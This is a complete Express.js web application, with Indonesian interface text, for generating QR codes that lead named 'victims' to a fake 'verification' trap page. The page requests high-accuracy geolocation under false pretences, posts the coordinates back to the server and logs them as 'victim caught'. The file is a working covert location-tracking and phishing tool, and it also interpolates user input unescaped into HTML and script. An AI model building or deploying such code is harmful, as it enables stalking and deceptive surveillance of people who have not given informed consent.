const express = require('express');
const qr = require('qrcode');
const app = express();

// ========== DATA SEMENTARA (HILANG SAAT RESTART) ==========
let qrDatabase = [];
let idCounter = 1;
const MAX_QR = 20000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static('public'));

// ========== FUNGSI AMBIL BASE URL OTOMATIS ==========
function getBaseUrl(req) {
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  return `${protocol}://${host}`;
}

// ========== DOWNLOAD QR ==========
app.get('/download/:id', (req, res) => {
  const id = parseInt(req.params.id);
  const item = qrDatabase.find(q => q.id === id);
  if (!item) return res.status(404).send('QR tidak ditemukan');
  const base64Data = item.qrImage.replace(/^data:image\/png;base64,/, '');
  const buffer = Buffer.from(base64Data, 'base64');
  res.setHeader('Content-Type', 'image/png');
  res.setHeader('Content-Disposition', `attachment; filename=QR_${item.id}_${item.nama.replace(/\s+/g, '_')}.png`);
  res.send(buffer);
});

// ========== HALAMAN UTAMA ==========
app.get('/', (req, res) => {
  const baseUrl = getBaseUrl(req);
  res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Bayangan Berbisik · RealZy</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&display=swap');
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      background: #0b0b0b;
      font-family: 'Inter', 'Courier New', monospace;
      color: #d1d5db;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
    }
    .main-card {
      background: rgba(18, 18, 18, 0.85);
      backdrop-filter: blur(12px);
      border: 1px solid #2a2a2a;
      border-radius: 2rem;
      padding: 2rem;
      max-width: 1200px;
      width: 100%;
      box-shadow: 0 20px 60px rgba(0,0,0,0.8), 0 0 0 1px rgba(180, 40, 40, 0.1);
    }
    .header-title {
      font-size: 2rem;
      font-weight: 600;
      letter-spacing: -0.02em;
      background: linear-gradient(135deg, #b91c1c, #7f1d1d);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .badge-status {
      background: rgba(180, 40, 40, 0.15);
      border: 1px solid rgba(180, 40, 40, 0.25);
      color: #fca5a5;
      font-size: 0.7rem;
      padding: 0.25rem 0.75rem;
      border-radius: 999px;
      display: inline-flex;
      align-items: center;
      gap: 0.4rem;
    }
    .dot-live {
      width: 7px;
      height: 7px;
      background: #ef4444;
      border-radius: 50%;
      display: inline-block;
      animation: pulse-dot 1.8s ease-in-out infinite;
    }
    @keyframes pulse-dot { 0%,100%{opacity:0.4;transform:scale(0.9);} 50%{opacity:1;transform:scale(1.2);} }
    .qr-card {
      background: rgba(30,30,30,0.6);
      border: 1px solid #2c2c2c;
      border-radius: 1.2rem;
      padding: 1.2rem;
      transition: all 0.2s ease;
    }
    .qr-card:hover { border-color: #4a4a4a; transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,0,0,0.4); }
    .qr-image { border-radius: 0.8rem; border: 1px solid #333; max-width: 120px; }
    .btn-primary {
      background: #991b1b; color: white; font-weight: 500; padding: 0.5rem 1.2rem;
      border-radius: 999px; border: none; transition: 0.2s; cursor: pointer; font-size: 0.85rem;
    }
    .btn-primary:hover { background: #7f1d1d; transform: scale(0.98); }
    .btn-outline {
      background: transparent; border: 1px solid #3f3f3f; color: #d1d5db;
      padding: 0.3rem 0.9rem; border-radius: 999px; font-size: 0.75rem; transition: 0.2s; cursor: pointer;
    }
    .btn-outline:hover { border-color: #6b6b6b; background: rgba(255,255,255,0.03); }
    .btn-download {
      background: #1e3a8a; color: white; padding: 0.3rem 0.9rem; border-radius: 999px;
      font-size: 0.75rem; text-decoration: none; transition: 0.2s; display: inline-flex; align-items: center; gap: 0.3rem;
    }
    .btn-download:hover { background: #1d4ed8; }
    .btn-danger {
      background: transparent; border: 1px solid #4a1a1a; color: #9b6b6b;
      padding: 0.3rem 0.9rem; border-radius: 999px; font-size: 0.75rem; transition: 0.2s; cursor: pointer;
    }
    .btn-danger:hover { background: rgba(180,40,40,0.1); border-color: #7f1d1d; color: #fca5a5; }
    .status-label { font-size: 0.6rem; font-weight: 600; padding: 0.15rem 0.6rem; border-radius: 999px; text-transform: uppercase; letter-spacing: 0.03em; }
    .status-hidden { background: #2d2d2d; color: #fbbf24; border: 1px solid #4b3a1a; }
    .status-visible { background: #064e3b; color: #34d399; border: 1px solid #0a5c46; }
    ::-webkit-scrollbar { width: 5px; }
    ::-webkit-scrollbar-track { background: #1a1a1a; }
    ::-webkit-scrollbar-thumb { background: #3a3a3a; border-radius: 10px; }
    input[type="text"] {
      background: #141414; border: 1px solid #2a2a2a; border-radius: 999px;
      padding: 0.6rem 1.2rem; color: #e5e7eb; font-size: 0.9rem; width: 100%; outline: none; transition: 0.2s;
    }
    input[type="text"]:focus { border-color: #991b1b; box-shadow: 0 0 0 3px rgba(153,27,27,0.15); }
    .divider { border: none; border-top: 1px solid #222; margin: 1.5rem 0; }
    .empty-state { border: 1px dashed #2a2a2a; border-radius: 1.5rem; padding: 3rem 1rem; text-align: center; color: #4b4b4b; font-size: 0.9rem; }
    .url-display { font-size: 0.75rem; color: #4ade80; background: #064e3b20; padding: 0.2rem 0.8rem; border-radius: 999px; border: 1px solid #0a5c46; display: inline-block; }
  </style>
</head>
<body>
<div class="main-card">
  <div class="flex flex-wrap items-center justify-between gap-3 border-b border-[#1f1f1f] pb-4 mb-6">
    <div>
      <h1 class="header-title">Bayangan Berbisik</h1>
      <div class="flex items-center gap-3 mt-1 text-sm text-gray-400 flex-wrap">
        <span class="badge-status"><span class="dot-live"></span> RealZy</span>
        <span>·</span>
        <span>${qrDatabase.length} / ${MAX_QR} kode</span>
        <span>·</span>
        <span class="url-display">${baseUrl}</span>
      </div>
    </div>
    <div class="text-xs text-gray-500 bg-[#141414] px-3 py-1.5 rounded-full border border-[#222]">🌐 Vercel</div>
  </div>

  <div class="bg-[#141414] rounded-2xl p-4 mb-6 border border-[#222]">
    <p class="text-xs text-gray-400 flex items-center gap-2">
      <span class="w-1.5 h-1.5 bg-green-500 rounded-full inline-block"></span>
      Domain otomatis: <span class="text-green-400 font-mono">${baseUrl}</span>
    </p>
    <p class="text-[0.6rem] text-gray-600 mt-1">⚠️ Data QR & lokasi bersifat sementara (hilang jika server restart).</p>
  </div>

  <div class="bg-[#141414] rounded-2xl p-5 mb-8 border border-[#222]">
    <h2 class="text-sm font-medium text-gray-300 mb-3 flex items-center gap-2">
      <span class="w-2 h-2 bg-red-600 rounded-full inline-block"></span> Buat QR Baru
    </h2>
    <form action="/generate" method="POST" class="flex flex-wrap gap-3 items-end">
      <div class="flex-1 min-w-[180px]">
        <label class="block text-xs text-gray-500 mb-1">Nama Korban</label>
        <input type="text" name="nama" placeholder="Contoh: Rian's Target" />
      </div>
      <button type="submit" class="btn-primary">Generate QR</button>
    </form>
  </div>

  <div>
    <div class="flex items-center justify-between mb-4">
      <h2 class="text-sm font-medium text-gray-300 flex items-center gap-2">
        <span class="w-4 h-4 border border-red-700/50 rotate-45 inline-block"></span> Daftar Kode
      </h2>
      <span class="text-xs text-gray-500">ID unik</span>
    </div>
    ${qrDatabase.length === 0 ? `
      <div class="empty-state"><div class="text-3xl mb-2 opacity-20">◈</div><p>Belum ada QR.</p></div>
    ` : `
      <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 max-h-[420px] overflow-y-auto pr-1">
        ${qrDatabase.map((item) => `
          <div class="qr-card">
            <div class="flex items-start justify-between gap-2">
              <div>
                <p class="text-sm font-semibold text-red-400/90">#${item.id}</p>
                <p class="text-sm truncate max-w-[140px] text-gray-200">${item.nama || 'Tanpa Nama'}</p>
                <p class="text-[0.6rem] text-gray-500">${new Date(item.timestamp).toLocaleString()}</p>
              </div>
              <span class="status-label ${item.ditampilkan ? 'status-visible' : 'status-hidden'}">
                ${item.ditampilkan ? 'Terlihat' : 'Tersembunyi'}
              </span>
            </div>
            <div class="mt-3 flex flex-wrap items-center gap-2">
              <form action="/tampilkan/${item.id}" method="POST" class="inline">
                <button type="submit" class="btn-outline">${item.ditampilkan ? 'Sembunyikan' : 'Tampilkan'}</button>
              </form>
              <a href="/download/${item.id}" class="btn-download" download><span>↓</span> Download</a>
              <form action="/hapus/${item.id}" method="POST" onsubmit="return confirm('Hapus?')" class="inline">
                <button type="submit" class="btn-danger">✕</button>
              </form>
            </div>
            ${item.ditampilkan ? `<div class="mt-3 pt-3 border-t border-[#222] flex justify-center"><img src="${item.qrImage}" class="qr-image" alt="QR"/></div>` : ''}
          </div>
        `).join('')}
      </div>
    `}
  </div>
  <hr class="divider" />
  <div class="flex flex-wrap justify-between items-center text-[0.6rem] text-gray-600">
    <span>RealZy · Vercel</span>
    <span>${new Date().toLocaleDateString('id-ID')}</span>
  </div>
</div>
</body>
</html>
  `);
});

// ========== GENERATE QR ==========
app.post('/generate', (req, res) => {
  if (qrDatabase.length >= MAX_QR) {
    return res.send(`<script>alert('Batas 20.000 tercapai!');window.location.href='/';</script>`);
  }
  const nama = req.body.nama || 'Target';
  const baseUrl = getBaseUrl(req);
  const url = `${baseUrl}/track?id=${idCounter}`;

  qr.toDataURL(url, (err, qrImage) => {
    if (err) return res.send('Gagal generate QR');
    qrDatabase.push({
      id: idCounter,
      nama: nama,
      url: url,
      qrImage: qrImage,
      timestamp: Date.now(),
      ditampilkan: false
    });
    idCounter++;
    res.redirect('/');
  });
});

// ========== TAMPILKAN / SEMBUNYIKAN ==========
app.post('/tampilkan/:id', (req, res) => {
  const id = parseInt(req.params.id);
  const item = qrDatabase.find(q => q.id === id);
  if (item) item.ditampilkan = !item.ditampilkan;
  res.redirect('/');
});

// ========== HAPUS QR ==========
app.post('/hapus/:id', (req, res) => {
  const id = parseInt(req.params.id);
  qrDatabase = qrDatabase.filter(q => q.id !== id);
  res.redirect('/');
});

// ========== HALAMAN JEBAKAN ==========
app.get('/track', (req, res) => {
  const id = req.query.id || '0';
  const item = qrDatabase.find(q => q.id === parseInt(id));
  const nama = item ? item.nama : 'Tanpa Nama';
  res.send(`
<!DOCTYPE html>
<html><head><title>Verifikasi...</title>
<script>
  function kirimLokasi(pos) {
    fetch('/report', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ id:"${id}", nama:"${nama}", lat:pos.coords.latitude, lng:pos.coords.longitude, waktu:new Date().toISOString() })
    }).then(() => { document.body.innerHTML='<h2 style="color:#b91c1c;text-align:center;margin-top:50px;">Akses ditolak</h2>'; });
  }
  function gagal() { document.body.innerHTML='<h2 style="color:gray;text-align:center;margin-top:50px;">Lokasi gagal</h2>'; }
  navigator.geolocation.getCurrentPosition(kirimLokasi, gagal, { enableHighAccuracy:true });
</script>
<style>body{background:#0b0b0b;color:#d1d5db;font-family:system-ui;text-align:center;padding:50px;}.box{max-width:400px;margin:auto;background:#141414;padding:40px;border-radius:2rem;border:1px solid #2a2a2a;}.loader{width:40px;height:40px;border:3px solid #222;border-top-color:#b91c1c;border-radius:50%;animation:spin 0.8s linear infinite;margin:20px auto;}@keyframes spin{to{transform:rotate(360deg);}}</style>
</head><body><div class="box"><div class="loader"></div><h1 style="color:#b91c1c;font-weight:400;">Verifikasi</h1><p style="color:#6b6b6b;">Izinkan akses lokasi</p></div></body></html>
  `);
});

// ========== LAPORAN LOKASI ==========
app.post('/report', (req, res) => {
  const data = req.body;
  console.log(JSON.stringify({ event: 'korban_tertangkap', ...data }, null, 2));
  res.send({ status: 'ok' });
});

// ========== EKSPOR UNTUK VERCEL ==========
module.exports = app;
